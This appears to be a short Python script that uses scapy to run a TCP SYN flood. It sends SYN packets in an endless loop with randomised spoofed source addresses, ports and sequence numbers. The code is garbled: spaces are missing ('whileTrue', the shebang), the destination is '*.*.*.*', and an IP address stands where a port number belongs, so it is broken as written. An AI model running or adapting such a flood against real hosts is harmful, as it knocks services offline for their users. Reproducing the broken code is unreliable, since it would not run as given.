#!/bin/envpython3 
from scapy.all import IP,TCP,send 
from ipaddress import IPv4Address 
from random import getrandbits 
ip=IP(dst="*.*.*.*") 
tcp=TCP(dport=10.0.9.5,flags=’S’) 
pkt=ip/tcp 
whileTrue: 
    pkt[IP].src=str(IPv4Address(getrandbits(32)))#sourceiP 
    pkt[TCP].sport=getrandbits(16)#sourceport 
    pkt[TCP].seq=getrandbits(32)#sequencenumber 
    send(pkt,verbose=0)